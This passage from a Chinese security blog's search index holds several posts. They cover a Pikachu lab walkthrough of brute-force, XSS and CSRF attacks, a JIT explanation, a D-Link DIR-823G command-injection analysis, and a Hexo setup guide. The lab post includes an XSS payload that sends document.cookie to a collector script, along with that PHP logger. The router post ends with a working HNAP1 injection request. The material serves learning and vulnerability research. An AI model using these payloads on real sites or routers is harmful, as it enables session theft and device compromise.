    <content type="html"><![CDATA[<h1 id="0x01-暴力破解"><a href="#0x01-暴力破解" class="headerlink" title="0x01 暴力破解"></a>0x01 暴力破解</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>开启bp抓包，对username,password字段的字典做爆破，得到admin/123456.</p><h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><p>随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。</p><p>将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。</p><h2 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2><p>同上步骤bp抓包，对用户密码进行爆破即可。后来查了一下这俩的区别。</p><p>查看源码，输入的验证码在本地验证：</p><p><img src="https://i.loli.net/2020/11/02/L4V56WHMm1JPDhc.png" alt="捕获.PNG"></p><p>可以在bp上不输入验证码或输入错误验证码都可以爆破。</p><h2 id="token防爆破？"><a href="#token防爆破？" class="headerlink" title="token防爆破？"></a>token防爆破？</h2><blockquote><p>token:token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个token便将此token返回给客户端，以后客户端只需要带着这个token前来请求数据即可。</p></blockquote><h3 id="基于token的身份验证"><a href="#基于token的身份验证" class="headerlink" title="基于token的身份验证"></a>基于token的身份验证</h3><ul><li>客户端使用用户名和密码请求登录</li><li>服务端收到请求去验证用户名和密码</li><li>验证成功后，服务端会签发一个token，再将token发送给客户端</li><li>客户端收到token后可以将它存储起来，比如放在cookie中或Local Storage里。</li><li>客户端每次向服务端请求资源的时候需要带着服务端签发的token</li><li>服务端收到请求，验证客户端请求里带着的token，如果验证成功，就像客户端返回请求的数据。</li><li>app登录的时候发送加密的用户名和密码到服务器，服务器验证用户名和密码，如果成功，以某种方式比如随机生成32位的字符串作为token，存储到服务器中，并返回token到app</li></ul><p>提交用户密码时页面会提交一个hidden属性的token值，每次提交都会更新，但每次产生的token以明文形式传到前端，我们可以在破解之前获取token值，填到字典中即可进行暴力破解。</p><p><img src="https://i.loli.net/2020/11/02/dlBS7qgfN9cYiIP.png" alt="捕获.PNG"></p><p>在测试器中，设置password和token两个变量，使用pitchfork。</p><p>点击<b>选项</b>，更改请求引擎中线程数为1，重定向选择<b>总是</b></p><p><b>Grep-Extract</b>选择<b>添加</b>，中间<b>获得回应包</b><br>，选择token的值复制并选定，点击OK.</p><p><img src="https://i.loli.net/2020/11/02/uLlDMSy46Qp8x2e.png" alt="捕获.PNG"></p><p>回到payload,set为1时设置简单清单，使用字典或自己随便输入密码。set为2时设置递归搜索，并如图黏贴token值。</p><p><img src="https://i.loli.net/2020/11/02/gHncFXtKMUB9udA.png" alt="捕获.PNG"></p><p>开始攻击，根据不同length找出正确密码，爆破完成。</p><p>注：该方法着实鸡肋。</p><h1 id="0x02-XSS-跨站脚本"><a href="#0x02-XSS-跨站脚本" class="headerlink" title="0x02 XSS(跨站脚本)"></a>0x02 XSS(跨站脚本)</h1><p>XSS是一种发生在前端浏览器端的漏洞，危害对象也是前端用户，形成XSS漏洞的主要原因是程序对输入输出没有做合适的处理，导致精心构造的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p><p>因此在XSS漏洞的防范上一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。</p><ul><li>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入。</li><li>输出转义：根据输出点的位置对输出到前端的额呢绒进行适当转义。</li></ul><h2 id="反射性xss-get"><a href="#反射性xss-get" class="headerlink" title="反射性xss(get)"></a>反射性xss(get)</h2><p>随意输入字符串，回显<b>who is xxx,i don’t care</b><br>f12查看，允许输入最大长度为20.</p><p><img src="https://i.loli.net/2020/11/03/vpRrZbsNSgJcqAj.png" alt="捕获.PNG"></p><p>更改一下可输入长度，输入一个简单的xss语句：<code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code></p><p>发现可以解析，即存在xss漏洞。</p><p><img src="https://i.loli.net/2020/11/03/hrEMJyIq98Cs2Vm.png" alt="捕获.PNG"></p><p>观察源码可知，它将提交的信息重新发送回来，后台没有对我们提交的信息做任何的漏洞。GET型的xss，一般将带有xss的url伪装后发送给目标即可。</p><p>如果是post型xss，无法直接使用url的方式进行攻击。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>需要一个接受cookie的服务器（127.0.0.1：80），来接收受害主机的cookie。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs #getcookie.php(把接收的cookie存到cookie.txt文件)">&lt;?php<br>$cookie=$_GET['cookie'];<br> #fp=$fopen("cookie.txt","a");<br>fwirte($fp,"Cookie:".$cookie."/n")<br>?&gt;<br></code></pre></td></tr></tbody></table></figure><ul><li>构造一个xss攻击的js代码</li></ul><p><code>&lt;script&gt;window.open("http://127.0.0.1/getcookie.php?cookie="+document.cookie);&lt;/script&gt;</code></p><p>新弹出窗口成功获取到cookie。但是cookie.txt中并没有存储到cookie值……</p><p><img src="https://i.loli.net/2020/11/04/thZo6fBkLyegRJj.png" alt="捕获.PNG"></p><h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>post型漏洞一般是使用表单方式进行提交，无法直接使用url进行攻击。</p><p>可以通过html页面方式提交，构造一个自己的post丢到自己的网站上</p><p>随意输入字符提交，发现它并未在url中进行提交，说明我们不能将恶意代码嵌入到url中发送。</p><p><img src="https://i.loli.net/2020/11/04/AOsxdLSJibDw8I6.png" alt="捕获.PNG"></p><p><img src="https://i.loli.net/2020/11/04/Tk6q81ICzpZtLdu.png" alt="捕获.PNG"></p><blockquote><p>http中get和post的基本区别：<br>get方式在客户端通过url提交数据，数据在url中可以看到；<br>Post方式，数据放置在html header内提交，数据在url中看不到。<br>get只能传输比较少的数据，安全性较低，post传输数据较多。</p></blockquote><p>我们可以构造一个带有表单提交的页面，让用户在登录完成后去点击，就可以盗取用户的cookie里。</p><h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>存储型xss下攻击者可以将脚本注入到后台存储起来构成更加持久的危害。<br>存储型xss又称永久型xss。</p><p>1.打开实验，页面是一个留言板，尝试输入1111，发现输入被存储。输入单引号双引号尖括号，发现可以正常输出，说明后台没进行过滤。</p><p><img src="https://i.loli.net/2020/11/04/UcbkOZPM56XoAGw.png" alt="捕获.PNG"></p><p>2.注入<code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code> 提交后会出现弹窗，每次刷新页面时都会弹出，与反射型xss的区别是：存储型xss已经被存储进后台代码中，所以每次刷新都会弹出XSS弹窗。所以存储型xss危害更大，会长久危害用户。</p><p><img src="https://i.loli.net/2020/11/04/uFGYlo5dkwHahMT.png" alt="捕获.PNG"></p><p><img src="https://i.loli.net/2020/11/04/IDX4duGil1fQwS5.png" alt="1111.PNG"></p><h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>DOM:一个一个访问html的标准编程接口，DOM是一个前端接口，没有和后端做任何的交互。</p><h1 id="0x03-CSRF"><a href="#0x03-CSRF" class="headerlink" title="0x03 CSRF"></a>0x03 CSRF</h1><p>CSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击.</p><h3 id="csrf攻击满足的条件"><a href="#csrf攻击满足的条件" class="headerlink" title="csrf攻击满足的条件"></a>csrf攻击满足的条件</h3><p>1.网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造</p><p>2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成</p><h3 id="csrf与xss的区别"><a href="#csrf与xss的区别" class="headerlink" title="csrf与xss的区别"></a>csrf与xss的区别</h3><p>csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而xss是直接盗取到了用户的权限，然后实施破坏。</p><h3 id="如何确认一个web系统存在csrf漏洞"><a href="#如何确认一个web系统存在csrf漏洞" class="headerlink" title="如何确认一个web系统存在csrf漏洞"></a>如何确认一个web系统存在csrf漏洞</h3><ul><li>1.对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造<ul><li>修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造；</li><li>对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造；</li></ul></li><li>2.确认凭证的有效期<ul><li>虽然退出或关闭了浏览器，但cookie仍然有效，或者session并没有及时国企，导致csrf攻击变得简单。</li></ul></li></ul><h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>登录账号，抓取修改个人信息流量包。</p><p><img src="https://i.loli.net/2020/11/04/oTmNylSJxc9vVGa.png" alt="11.PNG"></p><p>发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。</p><p>可以构造出CSRF攻击URL(bp抓的修改信息的包直接右键复制网址即可):</p><blockquote><p><a href="http://www.testbp.com:8081/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=1&amp;add=1&amp;email=1&amp;submit=submit">http://www.testbp.com:8081/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=1&amp;add=1&amp;email=1&amp;submit=submit</a></p></blockquote><p>诱使登录状态的用户点击url就可以完成CSRF攻击。</p><h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器）,站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。</p><p>步骤同get。但不知为何时灵时不灵。</p><p>正常登录状态：</p><p><img src="https://i.loli.net/2020/11/04/b7PA2OHu319LGlB.png" alt="捕获.PNG"></p><p>点击恶意url后，用户信息直接被修改。</p><p><img src="https://i.loli.net/2020/11/04/ZBbA8GrJfQtFe6U.png" alt="捕获.PNG"></p><h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h2><p>token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。</p><p>如图获取修改信息流量包后发现增加了token，无法利用。</p><p><img src="https://i.loli.net/2020/11/04/4fFa5SkYcCtyZGj.png" alt="捕获.PNG"></p><h2 id="防范CSRF措施"><a href="#防范CSRF措施" class="headerlink" title="防范CSRF措施"></a>防范CSRF措施</h2><ul><li>增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样</li><li>安全的会话管理（避免会话被利用）<ul><li>不要再客户端保存敏感信息（身份认证信息）</li><li>测试直接关闭，退出时的会话过期机制（一般是15-20分钟），无操作则自动登入超时。</li></ul></li><li>访问控制安全管理<ul><li>敏感信息修改时需要对身份进行二次认证（如修改账号时需要判断旧密码）</li><li>敏感信息的修改尽量使用post（post安全性高于get）</li><li>通过http头部中的referer来限制页面（修改个人信息的referer必须来自本域，不可来自其他域或无referer）</li></ul></li><li>增加验证码：一般用在登录（防暴力破解），也可用于其他重要信息操作的表单中。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JIT学习</title>
    <link href="/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="JIT原理"><a href="#JIT原理" class="headerlink" title="JIT原理"></a>JIT原理</h2><p>Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。</p><p>还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我们不必把所有的java方法都编译成机器码，只需要把调用最频繁，占据CPU时间最长的方法找出来将其编译成机器码，这种调用最频繁的java方法就是我们常说的热点方法。</p><h2 id="技术点"><a href="#技术点" class="headerlink" title="技术点"></a>技术点</h2><p>从大的框架，就是申请一块既有写权限又有执行权限的内存，然后把你要编译的java方法，翻译成机器码，写入到这块内存里，当再需要调用原来的java方法时，就转向调用这块内存。</p><p>例子：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">inc</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> </span>{<br>    <span class="hljs-keyword">return</span> a + <span class="hljs-number">1</span>;<br>}<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, <span class="hljs-built_in">inc</span>(<span class="hljs-number">3</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p><code>objdump -d 1</code>查看它的机器码。</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0000000000400526</span> &lt;<span class="hljs-keyword">inc</span>&gt;:<br>  <span class="hljs-number">400526</span>:<span class="hljs-number">55</span>                   <span class="hljs-keyword">push</span>   %rbp#保存上一个栈帧的基址，并把当前的栈指针赋给栈基址寄存器<br>  <span class="hljs-number">400527</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> e5             <span class="hljs-keyword">mov</span>    %rsp,%rbp<br>  40052a:<span class="hljs-number">89</span> <span class="hljs-number">7d</span> fc             <span class="hljs-keyword">mov</span>    %edi,-<span class="hljs-number">0x4</span>(%rbp)#把<span class="hljs-built_in">edi</span>存到栈上。在x64处理器上，前<span class="hljs-number">6</span>个参数都是使用寄存器传参的。第一个参数会使用<span class="hljs-built_in">rdi</span>，第二个参数使用 <span class="hljs-built_in">rsi</span>，等等。所以 <span class="hljs-built_in">edi</span> 里存的其实就是第一个参数，也就是整数 <span class="hljs-number">3</span><br>  <span class="hljs-number">40052d</span>:8b <span class="hljs-number">45</span> fc             <span class="hljs-keyword">mov</span>    -<span class="hljs-number">0x4</span>(%rbp),%eax#把上一步存到栈上的那个整数再存进 <span class="hljs-built_in">eax</span> 中<br>  <span class="hljs-number">400530</span>:<span class="hljs-number">83</span> c0 <span class="hljs-number">01</span>             <span class="hljs-keyword">add</span>    <span class="hljs-number">$0</span>x1,%eax#把 <span class="hljs-built_in">eax</span> 加上 <span class="hljs-number">1</span>， 然后就退栈，返回。按照x64的规定（ABI），返回值通过<span class="hljs-built_in">eax</span>传递<br>  <span class="hljs-number">400533</span>:<span class="hljs-number">5d</span>                   <span class="hljs-keyword">pop</span>    %rbp<br>  <span class="hljs-number">400534</span>:c3                   retq   <br></code></pre></td></tr></tbody></table></figure><p>我们发现，第三局第四局好像没有必要，gcc默认情况下生成的机器码有点没必要，它总要把入参放到栈上，但其实我们是可以直接把参数从rdi中放入到rax中的，在运行时修改inc的逻辑即可：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;memory.h&gt;</span></span><br> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(* inc_func)</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span>; <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{<br>    <span class="hljs-type">char</span> code[] = { <br>        <span class="hljs-number">0x55</span>,             <span class="hljs-comment">// push rbp</span><br>        <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-comment">// mov rsp, rbp</span><br>        <span class="hljs-number">0x89</span>, <span class="hljs-number">0xf8</span>,       <span class="hljs-comment">// mov edi, eax</span><br>        <span class="hljs-number">0x83</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x01</span>, <span class="hljs-comment">// add $1, eax</span><br>        <span class="hljs-number">0x5d</span>,             <span class="hljs-comment">// pop rbp</span><br>        <span class="hljs-number">0xc3</span>              <span class="hljs-comment">// ret</span><br>    };  <br>    <span class="hljs-type">void</span> * temp = <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">sizeof</span>(code), PROT_WRITE | PROT_EXEC,<br>            MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>); <br>    <span class="hljs-built_in">memcpy</span>(temp, code, <span class="hljs-built_in">sizeof</span>(code));<br>    inc_func p_inc = (inc_func)temp;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, <span class="hljs-built_in">p_inc</span>(<span class="hljs-number">7</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>mmap申请了一块有写权限和执行权限的内存，然后将手写的机器码考进去，使用一个函数指针指向这块内存并调用它，通过这种方式就可以执行这一段手写的机器码了。</p><p>我们通过手写机器码将原来的inc函数代替掉了，在新的例子中，我们使用程序中定义的数据来重新造了一个inc函数，这种在运行过程创建新的函数的方式，就是JIT的核心操作。</p>]]></content>
    
    
    
    <tags>
      
      <tag>chrome知识点</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dlink DIR-823G 漏洞挖掘过程</title>
    <link href="/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/"/>
    <url>/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>固件下载地址： <a href="https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA">https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA</a> 提取码：1ly1</p><h1 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h1><p><b>D-Link DIR-823G命令注入漏洞：</b></p><p>CVE编号：CVE-2019-15529</p><p>D-Link DIR-823G是中国台湾友讯（D-Link）公司的一款无线路由器。使用1.0.2B05版本固件的D-Link DIR-823G中的HNAP1存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 </p><h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h1><ul><li>binwalk -Me 固件.bin //解开固件</li></ul><p><img src="https://i.loli.net/2020/09/24/p67xmQnKZ83I4Hy.png" alt="捕获.PNG"></p><p>是一个squashfs文件系统，标准linux目录结构。</p><ul><li>cat /etc/init.d/rcS //查看路由器开启的服务。</li></ul><p>发现一个goahead进程。</p><blockquote><p>GoAhead(嵌入式Web服务器)，GoAhead自身实现一个web服务器所需提供的基本功能，提供多种方法供扩展服务器的功能，包括asp过程、goforms过程。用户定制型非常强，可通过goaead的api定义url处理函数和可供asp文件中调用的函数。<br><code>websUrlHandlerDefine(T("/goform"), NULL, 0, websFormHandler, 0);</code> /goform的请求交给websFormHandler函数处理<br><code>websUrlHandlerDefine(T("/cgi-bin"), NULL, 0, websCgiHandler, 0);</code> /cgi-bin的请求交给websCgiHandler函数处理。</p></blockquote><h2 id="模拟运行固件"><a href="#模拟运行固件" class="headerlink" title="模拟运行固件"></a>模拟运行固件</h2><p>环境使用工具firmware-ayalysis-toolkit。</p><p>搭建教程：<a href="https://zhuanlan.zhihu.com/p/110806057">https://zhuanlan.zhihu.com/p/110806057</a></p><p>运行起来后nmap扫端口，发现开了http服务和dns服务。</p><p>访问<a href="http://192.168.0.1,可看到dlink登录页面.要求用户做一些设置,不需要密码即可登录./">http://192.168.0.1,可看到Dlink登录页面。要求用户做一些设置，不需要密码即可登录。</a></p><p><img src="https://i.loli.net/2020/09/24/QizkImP7T8lfOuw.png" alt="捕获.PNG"></p><p>在固件解压的文件下找到名为 web_mtn的文件，应该是web目录。其中cgi-bin目录下存放的cgi文件可以非授权访问，可能造成影响。</p><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p><b><code>/cgi-bin/ExportSettings.sh</code> 导出配置文件，造成信息泄露。</b></p><p><img src="https://i.loli.net/2020/09/24/Eewn8h6ApNbuyYW.png" alt="捕获.PNG"></p><p><b><code>/cgi-bin/upload_settings.cgi</code> 导入配置文件，可导入恶意篡改后的配置。</b></p><p><img src="https://i.loli.net/2020/09/24/oDs9v3ulnqfLOFd.png" alt="捕获.PNG"></p><p><b><code>/cgi-bin/GetDownLoadSyslog.sh</code> 获取系统部分启动信息<code>/var/log/messages*</code></b></p><p><img src="https://i.loli.net/2020/09/24/uqGwiQNa2eHz3CB.png" alt="捕获.PNG"></p><p><b><code>/cgi-bin/upload_firmware.cgi</code> 上传更新固件，可恶意修改固件</b></p><h2 id="goahead-自定义的请求处理函数"><a href="#goahead-自定义的请求处理函数" class="headerlink" title="goahead 自定义的请求处理函数"></a>goahead 自定义的请求处理函数</h2><blockquote><p>处理函数的参数列表：<br>int websCgiHandler(webs_t wp, char_t *urlPrefix, char_t *webDir, int arg, char_t *url, char_t <em>path, char_t</em> query)<br>goForms过程:它主要用来响应用户输入以更新系统设置或者执行特定的动作。在GoAhead中，goForms实现为一个URL处理器，它会解释以”/goform”开始的URLs。紧跟着”goform”之后的字符串定义了表单名字和用户请求的细节.</p></blockquote><p>IDA打开goahead分析：</p><p>通过字符串/cgi-bin或/goform找到定义url的函数位置。交叉引用，发现注册处理函数位置为0x42424C.</p><p><img src="https://i.loli.net/2020/09/24/awysHvo6RAzcgI7.png" alt="捕获.PNG"></p><p>websUrlHandlerDefine 的第一个参数为 url, 第四个参数应该就是相应 url 的处理函数。</p><p>抓取登录数据包，发现往/HNAP1发送。</p><p><img src="https://i.loli.net/2020/09/24/ARI7bVkUMSxZuDJ.png" alt="捕获.PNG"></p><p>分析/HNAP1（0x42383C）处理函数逻辑:</p><p><img src="https://i.loli.net/2020/09/24/EHM2wAsrvhCTJdj.png" alt="捕获.PNG"></p><p>从 wp 结构体中取出此次请求需要调用的函数名，然后去全局函数表里面搜索，找到之后在进行处理。</p><p>找到需要调用的处理函数后，会首先记录POST原始报文。这里记录日志首先是用snprintf生成命令，然后system执行。</p><p><img src="https://i.loli.net/2020/09/24/XD2TKt8ClQEZ6Af.png" alt="捕获.PNG"></p><p>此处可以直接注入’来命令执行。</p><blockquote><p>在PHP中常用到以下几个函数来执行外部命令:<br>system</p><blockquote><p>system()函数能够将字符串作为OS命令执行，并自带输出到当前页面的功能</p></blockquote><p>exec<br>passthru<br>shell_exec</p></blockquote><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight makefile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile">POST /HNAP1/ HTTP/1.1<br><span class="hljs-section">Host: 192.168.0.1</span><br><span class="hljs-section">Content-Length: 53</span><br><span class="hljs-section">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="hljs-section">Content-Type: text/xml; charset=UTF-8</span><br><span class="hljs-section">Accept: */*</span><br><span class="hljs-section">SOAPAction: "http://purenetworks.com/HNAP1/Login"</span><br><span class="hljs-section">Accept-Encoding: gzip, deflate</span><br><span class="hljs-section">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="hljs-section">Connection: close</span><br>'`echo hacked_by_hac425!!!!!!!! &gt; /web_mtn/hack.txt`'<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Win10下使用Hexo搭建个人博客</title>
    <link href="/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="下载安装git、nodejs"><a href="#下载安装git、nodejs" class="headerlink" title="下载安装git、nodejs"></a>下载安装git、nodejs</h2><p>下载地址: </p><p>git: <a href="https://git-scm.com/">https://git-scm.com/</a> </p><p>nodejs: <a href="http://nodejs.cn/download/">http://nodejs.cn/download/</a></p><p>将nodejs加入path环境变量中。打开cmd测试：</p><p><img src="https://s2.loli.net/2022/08/07/NduraiRMcEQythF.png" alt="图片.png"></p><blockquote><p>报错1：输入 <code>npm-v</code> 出现报错:</p></blockquote><pre><code class="hljs">npm WARN config global --global, --local are deprecated. Use `–location</code></pre><p>解决方法：打开<code>nodejs</code>安装位置文件夹，打开<code>npm.cmd</code>和<code>npm</code>，将文件中的<code>prefix -g</code>替换为<code>prefix --location=global</code>,保存后重新打开cmd测试即可。</p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><h3 id="换源（淘宝源）"><a href="#换源（淘宝源）" class="headerlink" title="换源（淘宝源）"></a>换源（淘宝源）</h3><pre><code class="hljs">npm install -g cnpm --registry=https://registry.npm.taobao.orgcnpm -v </code></pre><p><img src="https://s2.loli.net/2022/08/07/9zM1KhnkOqAFsU6.png" alt="图片.png"></p><p>查看版本以及是否安装成功。</p><h3 id="安装hexo-1"><a href="#安装hexo-1" class="headerlink" title="安装hexo"></a>安装hexo</h3><pre><code class="hljs">cnpm install -g hexo-clihexo -v</code></pre><p>新建文件夹放置博客内容，在cmd中进入所建立的目录：</p><pre><code class="hljs">hexo init #初始化hexohexo s #启动hexo</code></pre><p>访问 <code> http://localhost:4000/</code>如下即成功：</p><p><img src="https://s2.loli.net/2022/08/07/dvIiunG5yhOEUX8.png" alt="图片.png"></p><h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h2><pre><code class="hljs">hexo new "文章标题"</code></pre><p>在目录/source/_posts/下生成文件.md<br>更新文章：<br>    hexo clean<br>    hexo g<br>    hexo s</p><h2 id="部署github"><a href="#部署github" class="headerlink" title="部署github"></a>部署github</h2><p>1、建立一个新的库，命名需要符合规则：<code>username.gitgub.io</code><br>2、命令行输入：</p><pre><code class="hljs">cnpm install --save hexo-deployer-git  </code></pre><p>3、更改设置</p><p>找到_config.yml文件，翻到最底部</p><p>将<code>type</code>改为<code>git</code></p><p>添加<code>repo: "此处为仓库地址"</code></p><p>添加<code>branch: master</code></p><p>repo为仓库地址 branch为master即可</p><p><img src="https://s2.loli.net/2022/08/07/akWVI3mUinyP2sJ.png" alt="图片.png"></p><p>4、部署到远端</p><pre><code class="hljs">git config --global user.email "xxx(此处为邮箱)"  git config --global user.name "xxx(此处为用户名)"  #github用户名hexo d  </code></pre><p>弹出网页提示是否关联git和github 授权即可</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
